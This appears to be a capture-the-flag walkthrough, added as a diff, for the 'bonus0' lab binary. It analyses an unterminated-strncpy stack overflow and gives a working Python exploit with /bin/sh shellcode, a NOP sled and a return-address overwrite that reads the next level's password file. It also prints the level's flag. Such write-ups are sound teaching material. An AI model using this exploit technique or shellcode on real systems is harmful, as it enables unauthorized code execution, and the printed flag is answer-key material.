@@ -1,0 +1,66 @@
+# bonus0 Walkthrough
+
+## Vulnerability: Buffer Overflow via strcpy/strcat with no null-termination
+
+### Binary Analysis
+
+Three functions:
+
+**p(dest, prompt):**
+- Reads up to 4096 bytes from stdin
+- Null-terminates at the first `\n`
+- Copies exactly 20 bytes with `strncpy(dest, buf, 20)` — NO null terminator if input is exactly 20 chars
+
+**pp(output):**
+- buf1 at ebp-0x30, buf2 at ebp-0x1c (exactly 20 bytes apart — adjacent in memory)
+- Calls p() twice: fills buf1 and buf2 with 20 bytes each (no null terminator)
+- `strcpy(output, buf1)`: buf1 has no null → reads through buf2 (also no null) → hits saved_ebx (0xb7fd0ff4, no nulls) → stops at saved_edi (0x00000000)
+  - Copies 44 bytes to output
+- Appends " " at output[44]
+- `strcat(output, buf2)`: buf2 has no null → reads through saved_ebx → appends 24 bytes starting at output[45]
+- Total written: 69 bytes
+
+**main():**
+- output buffer at esp+0x16, allocated via `sub $0x40, %esp`
+- Buffer is only 42 bytes within allocated frame
+- main's return address at **offset 54** from the output buffer
+
+### Exploit
+
+Stack is RWE (executable) and ASLR is disabled.
+
+1. Put shellcode in environment variable `SC` with a 200-byte NOP sled
+2. Target middle of NOP sled: ~0xbfffff73
+3. Craft inputs:
+   - Input 1: 20 'A' bytes (no null, fills buf1)
+   - Input 2: 9 bytes padding + 4-byte address + 7 bytes padding (20 bytes total)
+   - `buf2[9:13]` overwrites main's return address (strcat writes buf2 at output offset 45, return addr at offset 54, so 54-45=9)
+
+### Exploit Script
+
+```python
+import pty, os, time, subprocess, struct, select
+
+shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+nop_sled = '\x90' * 200
+env = {'SC': nop_sled + shellcode, 'PATH': '/bin:/usr/bin'}
+
+sc_addr = 0xbfffff73  # middle of NOP sled
+inp1 = 'A' * 20
+inp2 = 'B' * 9 + struct.pack('<I', sc_addr) + 'B' * 7
+
+m, s = pty.openpty()
+proc = subprocess.Popen(['/home/user/bonus0/bonus0'], stdin=s, stdout=s, stderr=s, env=env)
+os.close(s)
+time.sleep(0.3)
+os.write(m, inp1 + '\n')
+time.sleep(0.3)
+os.write(m, inp2 + '\n')
+time.sleep(0.5)
+os.write(m, 'cat /home/user/bonus1/.pass\n')
+time.sleep(1)
+# Read output to get the flag
+```
+
+### Flag
+`cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
